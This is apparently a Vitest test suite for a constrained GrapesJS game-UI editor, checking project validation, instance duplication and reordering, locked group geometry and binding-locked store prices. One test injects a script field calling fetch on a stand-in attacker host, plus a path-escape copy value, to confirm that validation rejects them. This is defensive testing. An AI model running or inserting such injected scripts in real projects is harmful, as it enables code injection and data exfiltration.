import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

import {
  canReorderInstance,
  createStarterProject,
  createConstrainedGrapesProject,
  duplicateInstance,
  isContainerInstance,
  reorderInstance,
  updateInstancePresentation,
  validateProjectFile,
  type GrapesShellProject,
} from "../../src/shared/project.ts";
import { composeFactCopy, deriveEditableLabel } from "../../src/shared/facts.ts";
import { readSeedManifest } from "../../src/shared/seed.ts";

const workspaceRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const repositoryRoot = path.resolve(workspaceRoot, "../..");
const seedRoot = path.join(repositoryRoot, "games/shell_proof_grapes/design");

async function manifest() {
  return readSeedManifest(seedRoot);
}

describe("constrained GrapesJS project", () => {
  it("validates a seven-page V2 starter project against the frozen Grapes asset manifest", async () => {
    const project = createStarterProject();
    const seed = await manifest();

    const parsed = validateProjectFile(project, seed);

    expect(parsed.presentation.pages.map((page) => page.stateId)).toEqual([
      "menu",
      "level",
      "shop",
      "settings",
      "pause",
      "win",
      "fail",
    ]);
    expect(parsed.presentation.pages.flatMap((page) => page.instances).some((instance) => instance.presentation.assetId)).toBe(true);
    expect(parsed.targetGame).toBe("shell_proof_grapes");
    expect(() => validateProjectFile(project, seed, "another_game")).toThrow(/targets game/i);
  });

  it("duplicates with a new stable identity while retaining the original runtime binding", async () => {
    const project = createStarterProject();
    const duplicate = duplicateInstance(project, "menu.currency");
    const seed = await manifest();
    const parsed = validateProjectFile(duplicate.project, seed);
    const page = parsed.presentation.pages.find((candidate) => candidate.stateId === "menu");
    const copy = page?.instances.find((instance) => instance.id === duplicate.instanceId);
    const original = page?.instances.find((instance) => instance.id === "menu.currency");

    expect(duplicate.instanceId).not.toBe("menu.currency");
    expect(copy?.bindingId).toBe(original?.bindingId);
    expect(copy?.prototypeInstanceId).toBe(original?.prototypeInstanceId);
  });

  it("keeps a duplicated child inside its semantic parent subtree", async () => {
    const seed = await manifest();
    const duplicate = duplicateInstance(createStarterProject(), "menu.node.current");
    const parsed = validateProjectFile(duplicate.project, seed);
    const page = parsed.presentation.pages.find((candidate) => candidate.stateId === "menu")!;
    const progression = page.instances.find((instance) => instance.id === "menu.progression-map")!;
    const copy = page.instances.find((instance) => instance.id === duplicate.instanceId)!;
    const children = page.instances
      .filter((instance) => instance.parentInstanceId === progression.id)
      .sort((left, right) => left.presentation.order - right.presentation.order);

    expect(copy.parentInstanceId).toBe(progression.id);
    expect(children.at(-1)?.id).toBe(copy.id);
    expect(children[0]!.presentation.order).toBe(progression.presentation.order + 1);
    expect(children.every((child, index) => child.presentation.order === progression.presentation.order + index + 1)).toBe(true);
  });

  it("fails closed before load when raw Grapes data carries executable fields or diverges from the AST", async () => {
    const seed = await manifest();
    const malicious = createStarterProject() as unknown as Record<string, unknown>;
    const grapes = malicious.grapesjs as { pages: Array<Record<string, unknown>> };
    grapes.pages[0]!.script = "fetch('https://attacker.invalid')";

    expect(() => validateProjectFile(malicious, seed)).toThrow(/script|unsafe|unsupported/i);

    const divergent = createStarterProject() as unknown as Record<string, unknown>;
    const pages = (divergent.grapesjs as { pages: Array<{ components: Array<Record<string, unknown>> }> }).pages;
    pages[0]!.components[0]!.copy = "Different portable component";

    expect(() => validateProjectFile(divergent, seed)).toThrow(/diverge|canonical/i);

    const source = createStarterProject();
    const presentation = structuredClone(source.presentation);
    presentation.pages[0]!.instances[0]!.presentation.copy = "..\\untrusted-copy";
    const pathEscape = { ...source, presentation, grapesjs: createConstrainedGrapesProject(presentation) };

    expect(() => validateProjectFile(pathEscape, seed)).toThrow(/unsafe|path/i);
  });

  it("fails closed when a curated asset targets a slot its semantic role does not own", async () => {
    const seed = await manifest();
    const source = createStarterProject();

    const crossSlot = structuredClone(source.presentation);
    // menu.play owns the button-surface slot; icon-control.settings targets icon-control.
    crossSlot.pages
      .find((page) => page.stateId === "menu")!
      .instances.find((instance) => instance.id === "menu.play")!.presentation.assetId = "icon-control.settings";
    const crossSlotProject = { ...source, presentation: crossSlot, grapesjs: createConstrainedGrapesProject(crossSlot) };
    expect(() => validateProjectFile(crossSlotProject, seed)).toThrow(/targets slot|incompatible|slot/i);

    const unknown = structuredClone(source.presentation);
    unknown.pages
      .find((page) => page.stateId === "menu")!
      .instances.find((instance) => instance.id === "menu.play")!.presentation.assetId = "does.not.exist";
    const unknownProject = { ...source, presentation: unknown, grapesjs: createConstrainedGrapesProject(unknown) };
    expect(() => validateProjectFile(unknownProject, seed)).toThrow(/unknown/i);
  });

  it("uses only the committed U2 manifest's canonical U1 asset catalog as its vocabulary", async () => {
    const seed = await manifest();
    const raw = JSON.parse(await readFile(path.join(seedRoot, "kenney-seed.manifest.json"), "utf8")) as {
      assetCatalog: { assets: Array<{ id: string }> };
    };

    expect(seed.assets.map((asset) => asset.id)).toEqual(raw.assetCatalog.assets.map((asset) => asset.id));
  });

  it("accepts only U1 color channels for palette edits", async () => {
    const seed = await manifest();
    const project = createStarterProject();
    const updated = updateInstancePresentation(
      project,
      "menu.play",
      { colors: { ...project.presentation.pages[0]!.instances.find((instance) => instance.id === "menu.play")!.presentation.colors, background: "#ff3355" } },
      seed,
    );

    expect(updated.presentation.pages[0]!.instances.find((instance) => instance.id === "menu.play")!.presentation.colors?.background).toBe("#ff3355");
    expect(() => updateInstancePresentation(project, "menu.play", { colors: { surface: "#ff3355" } }, seed)).toThrow(
      /unsupported color channel/i,
    );
  });

  it("reorders sibling subtrees while keeping every child above its semantic parent", async () => {
    const seed = await manifest();
    const initial = createStarterProject();
    // menu.nav (the v2 bottom dock) and menu.progression-map are both top-level
    // instances that own child subtrees; reordering the dock backward past the
    // map must move the whole dock while both subtrees stay contiguous.
    const originalOrder = initial.presentation.pages
      .find((candidate) => candidate.stateId === "menu")!
      .instances.find((instance) => instance.id === "menu.nav")!.presentation.order;
    const reordered = reorderInstance(initial, "menu.nav", "backward", seed);
    const page = reordered.presentation.pages.find((candidate) => candidate.stateId === "menu")!;
    const nav = page.instances.find((instance) => instance.id === "menu.nav")!;
    const progression = page.instances.find((instance) => instance.id === "menu.progression-map")!;
    const navChildren = page.instances.filter((instance) => instance.parentInstanceId === nav.id);
    const progressionChildren = page.instances.filter((instance) => instance.parentInstanceId === progression.id);

    expect(nav.presentation.order).toBeLessThan(originalOrder);
    expect(nav.presentation.order).toBeLessThan(progression.presentation.order);
    expect(navChildren.every((child) => child.presentation.order > nav.presentation.order)).toBe(true);
    expect(progressionChildren.every((child) => child.presentation.order > progression.presentation.order)).toBe(true);
    expect(validateProjectFile(reordered, seed).presentation.pages).toHaveLength(7);
  });

  it("never reorders a child across its parent boundary", async () => {
    const seed = await manifest();
    const project = createStarterProject();

    expect(canReorderInstance(project, "menu.node.completed", "backward")).toBe(false);
    expect(reorderInstance(project, "menu.node.completed", "backward", seed)).toBe(project);

    const reordered = reorderInstance(project, "menu.node.current", "backward", seed);
    const page = reordered.presentation.pages.find((candidate) => candidate.stateId === "menu")!;
    const progression = page.instances.find((instance) => instance.id === "menu.progression-map")!;
    const completed = page.instances.find((instance) => instance.id === "menu.node.completed")!;
    const current = page.instances.find((instance) => instance.id === "menu.node.current")!;

    expect(current.presentation.order).toBeLessThan(completed.presentation.order);
    expect(current.presentation.order).toBeGreaterThan(progression.presentation.order);
    expect(current.parentInstanceId).toBe(progression.id);
  });

  it("does not allocate or dirty a project when a layer is already at its boundary", async () => {
    const seed = await manifest();
    const project = createStarterProject();

    expect(reorderInstance(project, "menu.title", "backward", seed)).toBe(project);
  });

  it("reorders the bottom-dock trio within its group without crossing the dock boundary", async () => {
    const seed = await manifest();
    const project = createStarterProject();

    // Shop / Play / Settings are the menu.nav dock's semantic sibling group.
    const dockOrder = (source = project) =>
      source.presentation.pages
        .find((page) => page.stateId === "menu")!
        .instances.filter((instance) => instance.parentInstanceId === "menu.nav")
        .sort((left, right) => left.presentation.order - right.presentation.order)
        .map((instance) => instance.id);
    expect(dockOrder()).toEqual(["menu.shop", "menu.play", "menu.settings"]);

    // A dock child moves only among its dock siblings.
    const moved = reorderInstance(project, "menu.shop", "forward", seed);
    expect(dockOrder(moved)).toEqual(["menu.play", "menu.shop", "menu.settings"]);

    // The dock group has hard ends: its first/last child cannot leave the group.
    expect(canReorderInstance(project, "menu.shop", "backward")).toBe(false);
    expect(canReorderInstance(project, "menu.settings", "forward")).toBe(false);
    expect(
      reorderInstance(moved, "menu.shop", "forward", seed).presentation.pages
        .find((page) => page.stateId === "menu")!
        .instances.filter((instance) => instance.parentInstanceId === "menu.nav")
        .every((instance) => instance.parentInstanceId === "menu.nav"),
    ).toBe(true);
  });

  it("identifies semantic groups by the children they own", async () => {
    const project = createStarterProject();

    // menu.nav owns the Shop/Play/Settings dock trio.
    expect(isContainerInstance(project, "menu.nav")).toBe(true);
    expect(isContainerInstance(project, "menu.progression-map")).toBe(true);
    // Its children — and any leaf control — are not groups.
    expect(isContainerInstance(project, "menu.play")).toBe(false);
    expect(isContainerInstance(project, "menu.currency")).toBe(false);
  });

  it("locks group geometry so moving a container cannot leave its child controls behind", async () => {
    const seed = await manifest();
    const project = createStarterProject();
    const navGeometry = project.presentation.pages
      .find((page) => page.stateId === "menu")!
      .instances.find((instance) => instance.id === "menu.nav")!.presentation.geometry;

    // A group geometry edit fails closed — even one that only nudges the offset.
    expect(() =>
      updateInstancePresentation(
        project,
        "menu.nav",
        { geometry: { ...navGeometry, offset: { ...navGeometry.offset, x: navGeometry.offset.x + 0.01 } } },
        seed,
      ),
    ).toThrow(/group .*geometry is locked/i);

    // A leaf child (menu.play) still accepts a geometry edit through the same path.
    const playGeometry = project.presentation.pages
      .find((page) => page.stateId === "menu")!
      .instances.find((instance) => instance.id === "menu.play")!.presentation.geometry;
    expect(() => updateInstancePresentation(project, "menu.play", { geometry: playGeometry }, seed)).not.toThrow();
    // A group can still take non-geometry edits (color) without detaching children.
    expect(() => updateInstancePresentation(project, "menu.nav", { colors: { background: "#223344" } }, seed)).not.toThrow();
  });

  it("locks group duplication so a container copy cannot orphan its child controls", async () => {
    const project = createStarterProject();

    expect(() => duplicateInstance(project, "menu.nav")).toThrow(/cannot be duplicated/i);
    // A leaf child still duplicates.
    expect(duplicateInstance(project, "menu.currency").instanceId).not.toBe("menu.currency");
  });

  it("seeds the source-grounded win/fail facts, including the rescue-bundle outcome", async () => {
    const seed = await manifest();
    // Validate through the closed AST so the seeded copy is proven both present
    // and contract-legal (copy length, plain-Unicode) — the editor projection.
    const parsed = validateProjectFile(createStarterProject(), seed);
    const copyOf = (id: string) =>
      parsed.presentation.pages
        .flatMap((page) => page.instances)
        .find((instance) => instance.id === id)?.presentation.copy;

    // The rewired U1 bottom dock trio is seated on the menu.nav dock.
    const instanceIds = new Set(parsed.presentation.pages.flatMap((page) => page.instances).map((instance) => instance.id));
    for (const id of ["menu.shop", "menu.play", "menu.settings"]) expect(instanceIds.has(id)).toBe(true);

    // Concrete win/fail facts a player must read (shell_proof_phaser source).
    expect(copyOf("win.reward")).toContain("5 Coins");
    expect(copyOf("win.claim-double")).toContain("Watch ad");
    expect(copyOf("fail.currency")).toContain("25 Coins");
    expect(copyOf("fail.continue-coins")).toContain("10 Coins");

    // The rescue bundle is one leaf action, so its single copy field must carry
    // name + price + the outcome it grants. The outcome ("Continue this level")
    // is the fact the A1 aesthetics review flagged as missing.
    const bundle = copyOf("fail.bundle");
    expect(bundle).toContain("Rescue bundle");
    expect(bundle).toContain("$4.99");
    expect(bundle).toContain("Continue this level");
  });

  it("fails closed when designer copy overwrites a binding-derived runtime/store fact", async () => {
    const seed = await manifest();
    const project = createStarterProject();

    // A pure runtime/store read (reward, balance) is owned entirely by its
    // binding: the whole copy value cannot be edited to lie about the store.
    expect(() => updateInstancePresentation(project, "win.reward", { copy: "9999 Coins earned" }, seed)).toThrow(
      /binding-derived|owned by binding/i,
    );
    expect(() => updateInstancePresentation(project, "fail.currency", { copy: "9999 Coins" }, seed)).toThrow(
      /binding-derived|owned by binding/i,
    );

    // An action fact (cost, price, outcome, mechanic) keeps an editable label but
    // its locked fact segment cannot be dropped or altered by designer copy.
    expect(() => updateInstancePresentation(project, "fail.continue-coins", { copy: "Continue" }, seed)).toThrow(
      /binding-derived|must keep/i,
    );
    expect(() =>
      updateInstancePresentation(project, "fail.bundle", { copy: "Rescue bundle · $0.99 · Continue this level" }, seed),
    ).toThrow(/binding-derived|must keep/i);
    expect(() =>
      updateInstancePresentation(project, "fail.bundle", { copy: "Rescue bundle · $4.99" }, seed),
    ).toThrow(/binding-derived|must keep/i);
  });

  it("lets the designer restyle only the call-to-action label while the store fact stays locked", async () => {
    const seed = await manifest();
    const project = createStarterProject();

    // The editor commits label edits as composeFactCopy(prototype, label).
    const relabeled = updateInstancePresentation(
      project,
      "fail.continue-coins",
      { copy: composeFactCopy("fail.continue-coins", "Keep going") },
      seed,
    );
    const copyOf = (source: GrapesShellProject, id: string) =>
      source.presentation.pages.flatMap((page) => page.instances).find((instance) => instance.id === id)?.presentation.copy;
    expect(copyOf(relabeled, "fail.continue-coins")).toBe("Keep going · 10 Coins");
    expect(deriveEditableLabel("fail.continue-coins", copyOf(relabeled, "fail.continue-coins"))).toBe("Keep going");
  });

  it("keeps the binding-fact lock on a duplicated fact instance so it is not an editable back door", async () => {
    const seed = await manifest();
    const duplicate = duplicateInstance(createStarterProject(), "fail.currency");
    // The duplicate inherits fail.currency's prototype, so its copy is still owned
    // by the balance binding — validation passes with the inherited fact intact.
    expect(() => validateProjectFile(duplicate.project, seed)).not.toThrow();

    const tampered = structuredClone(duplicate.project.presentation);
    tampered.pages
      .flatMap((page) => page.instances)
      .find((instance) => instance.id === duplicate.instanceId)!.presentation.copy = "9999 Coins";
    const tamperedProject = {
      ...duplicate.project,
      presentation: tampered,
      grapesjs: createConstrainedGrapesProject(tampered),
    };
    expect(() => validateProjectFile(tamperedProject, seed)).toThrow(/binding-derived|owned by binding/i);
  });
});
